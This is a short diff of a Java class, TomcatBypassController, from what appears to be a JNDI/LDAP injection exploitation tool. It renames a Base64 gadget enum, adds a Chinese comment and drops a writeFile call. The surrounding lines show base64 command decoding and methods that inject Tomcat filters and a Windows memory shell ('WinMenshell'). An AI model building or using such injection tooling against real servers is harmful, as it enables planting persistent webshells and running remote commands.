@@ -205,7 +205,7 @@ public class TomcatBypassController implements LdapController {
                 }
             }
 
-            if (gadgetType == GadgetType.Base64) {
+            if (gadgetType == GadgetType.base64) {
                 String cmd = Util.getCmdFromBase(base);
                 System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Command >> |@" + cmd));
                 params = new String[]{cmd};
@@ -255,6 +255,7 @@ public class TomcatBypassController implements LdapController {
         }
 
         public String injectTomcatFilterJmx() throws Exception {
+            //初始化全局配置
             Config.init();
             ClassPool pool = ClassPool.getDefault();
             pool.insertClassPath(new ClassClassPath(TFJMX.class));
@@ -269,7 +270,6 @@ public class TomcatBypassController implements LdapController {
                 TinsertLinAgent(ctClass);
                 return injectClass(WinMenshell.class);
             }
-            ctClass.writeFile();
             return injectClass(ctClass.getClass());
         }
 
